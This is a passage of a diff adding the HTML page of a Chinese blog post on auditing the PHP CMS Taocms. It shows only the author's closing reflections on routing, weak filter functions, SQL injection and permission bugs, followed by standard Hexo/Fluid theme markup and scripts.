+<p>而且它主要是通过类加载来实现功能点，也是它比较特殊的点。然后过滤函数也写得比较水，其实还是很好挖掘的，最重要的自我感觉还是一定要弄清楚，一开始只是对路由有个大概的理解，还是没有深度去看代码，导致了我之后对sql注入的传参、挖掘还懵了一下，所以<strong>路由很重要！！！不要局限在表面</strong></p>
+<p>多了解了一个路由方式。还有就是深度挖掘经典漏洞可以从函数入手，但是权限方面的漏洞，自我感觉要结合黑盒的思路，通过功能、权限参数的对比，然后去深究代码挖掘。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php代审2--Taocms</div>
+      <div>http://example.com/2025/01/21/php代审2-Taocms/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Yf3te</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/19/%E5%88%9D%E8%AF%86php%E4%BB%A3%E5%AE%A1%E2%80%94%E2%80%94baijiacms/" title="初识php代审——baijiacms">
+                        <span class="hidden-mobile">初识php代审——baijiacms</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"nPsiBpqAh9nfJ5Dy1WuaF7QX-MdYXbMMI","appKey":"uHgPDZvMgamWIL1SjZs4NpY4","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量
+        <span id="leancloud-site-pv"></span>
+        次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数
+        <span id="leancloud-site-uv"></span>
+        人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
